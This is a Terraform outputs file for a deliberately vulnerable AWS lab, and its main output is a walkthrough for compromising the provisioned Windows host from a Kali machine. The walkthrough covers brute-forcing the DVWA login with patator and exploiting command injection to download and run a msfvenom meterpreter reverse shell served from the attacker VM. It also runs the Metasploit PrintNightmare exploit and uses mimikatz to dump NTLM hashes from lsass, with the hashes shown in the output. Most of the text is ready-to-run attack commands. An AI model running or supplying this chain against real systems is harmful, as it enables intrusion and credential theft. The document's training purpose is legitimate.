################################################################################
# Additional
################################################################################

#output "region" {
#  description = "AWS region"
#  value       = var.region
#}
#
#output "current-aws-account" {
#  description = "Current AWS account"
#  value       = data.aws_caller_identity.current.account_id
#}
#
#output "aws-availability-zones" {
#  description = "current aws availability zones"
#  value       = data.aws_availability_zones.available.names
#}

output "hack_write_up" {
  value = <<EOT
# Hack Windows machine

- login to your Kali machine

```bash
ssh kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- install some additional packages

```bash
sudo apt update
sudo apt install -y wordlists gobuster dirsearch metasploit-framework golang patator
```

## Port scanning

- scan your windows target with nmap

nmap -A ${module.windows-instance.private_ip}

## dir buster

gobuster dir -u http://${module.windows-instance.private_ip}:8080 -w /usr/lib/python3/dist-packages/dirsearch/db/dicc.txt -q

## brute force login

- get a valid `user_token` and save it in the CSRF variable

```bash
CSRF=$(curl -s -c dvwa.cookie "${module.windows-instance.private_ip}:8080/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
```

- get a valid session id

```bash
SESSIONID=$(grep PHPSESSID dvwa.cookie | cut -d $'\t' -f7)
```

- execute the patator brute force tool to get valid credentials

```bash
patator http_fuzz 1=/usr/share/wordlists/metasploit/http_default_users.txt 0=/usr/share/wordlists/metasploit/http_default_pass.txt --threads=8 timeout=1 --rate-limit=1 url="http://${module.windows-instance.private_ip}:8080/DVWA/login.php" method=POST body="username=FILE1&password=FILE0&user_token=$\{CSRF\}&Login=Login" header="Cookie: PHPSESSID=$\{SESSIONID\}" -x ignore:fgrep=login.php -x quit:fgrep=index.php follow=0 accept_cookie=0

09:01:15 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.10 at 2022-06-03 09:01 UTC
09:01:15 patator    INFO -
09:01:15 patator    INFO - code size:clen       time | candidate                          |   num | mesg
09:01:15 patator    INFO - -----------------------------------------------------------------------------
09:01:17 patator    INFO - 302  424:0          0.012 | password:admin                     |    15 | HTTP/1.1 302 Found
09:01:18 patator    INFO - Hits/Done/Skip/Fail/Size: 1/22/0/0/234, Avg: 6 r/s, Time: 0h 0m 3s
09:01:18 patator    INFO - To resume execution, pass --resume 3,3,3,3,3,3,2,2
```

### fix patator

- if you get the following error `<class 'pycurl.error'> (49, "Couldn't parse CURLOPT_RESOLVE entry ''!")` then edit `/usr/bin/patator`

```bash
sudo vim /usr/bin/patator
```

- search for `pycurl.RESOLVE` and comment out the line

```
#fp.setopt(pycurl.RESOLVE, [resolve])
```

## WebApp scanner

- install the WebApp scanner

```bash
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest

export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

- scan the DVWA WebApp

```bash
nuclei -u http://${module.windows-instance.private_ip}:8080/dvwa
```

## Exploit command injectionin WebApp

- login to the DVWA WebApp `http://${module.windows-instance.public_ip}:8080/dvwa` with with username `admin` and password `password`
- go to the Command Injection `http://${module.windows-instance.public_ip}:8080/dvwa/vulnerabilities/exec`

- execute the first command

```powershell
|powershell -c ls
```

- read the text file

```powershell
|powershell -c cat installed-with-user.txt
```

- check the rights of the mondoo user

```cmd
|net user mondoo
```

- create a meterpreter reverse payload on your kali

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=${module.kali.private_ip} LPORT=4242 -f exe > met.exe
```

- install and start a web server on your kali

```
sudo gem install webrick
ruby -run -ehttpd . -p8001
```

- download the shell code via DVWA command injection

```powershell
|powershell -c wget "http://${module.kali.private_ip}:8001/met.exe" -outfile "C:\windows\temp\met.exe"
```

- login via another console to your Kali machine

```bash
ssh kali@${module.kali.public_ip}

password: ${random_string.suffix.result}
```

- start the metasploit multi handler to receive the connection from `met.exe`

```bash
msfconsole -q -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set lhost 0.0.0.0; set lport 4242;run'
```

- execute the meterpreter shell

```powershell
|powershell -c C:\windows\temp\met.exe
```

- now you got a meterpreter reverse shell
- to get a shell just type `shell`

## Exploit printnightmare

- start metasploit framework on the kali vm

```bash
msfconsole
```

- configure metasploit framework to exploit printnightmare vulnerability

```bash
msf6 > use exploit/windows/dcerpc/cve_2021_1675_printnightmare
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set RHOSTS ${module.windows-instance.private_ip}
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBUSER mondoo
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set SMBPASS mondoo.com
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > set payload windows/x64/shell_reverse_tcp
msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > run
```

## mimikatz

Mimikatz is an open-source application that allows users to view and save authentication credentials like Kerberos tickets

- download mimikatz to the windows vm

```powershell
C:\Windows\system32>powershell
powershell
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

PS C:\Windows\system32> wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip" -outfile "C:\windows\temp\mimikatz_trunk.zip"
wget "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip" -outfile "C:\windows\temp\mimikatz_trunk.zip"
```

- exract the mimikatz zip file

```powershell
PS C:\Windows\system32> cd C:\windows\temp\
cd C:\windows\temp\

PS C:\windows\temp> Expand-Archive mimikatz_trunk.zip -Force
Expand-Archive mimikatz_trunk.zip -Force

PS C:\windows\temp> cd mimikatz_trunk\x64
cd mimikatz_trunk\x64
```

- start mimikatz and dump credentials from windows `lsass.exe` process

```powershell
PS C:\windows\temp\mimikatz_trunk\x64> .\mimikatz.exe
.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::msv

Authentication Id : 0 ; 3255438 (00000000:0031ac8e)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : EC2AMAZ-5A4CSBH
Logon Server      : EC2AMAZ-5A4CSBH
Logon Time        : 6/3/2022 9:35:18 AM
SID               : S-1-5-21-2073652273-2496418537-3488842278-500
        msv :
        [00000003] Primary
        * Username : Administrator
        * Domain   : EC2AMAZ-5A4CSBH
        * NTLM     : 7facdc498ed1680c4fd1448319a8c04f
        * SHA1     : 24b8b6c9cbe3cd8818683ab9cd0d3de14fc5c40b
.......
```

- use the web page [https://crackstation.net/](https://crackstation.net/) to crack the NTLM-hash of the Administrator

# Logins

## Kali

Username and password:

```
kali: ${random_string.suffix.result}
```

ssh command:

```bash
ssh kali@${module.kali.public_ip}
```

privat ip:

```
${module.kali.private_ip}
```

## Windows RDP Access:

```bash
xfreerdp /u:Administrator /v:${module.windows-instance.public_ip}:3389 /h:2048 /w:2048 /p:'Password1!'
```

privat ip:

```
${module.windows-instance.private_ip}
```
  EOT
}
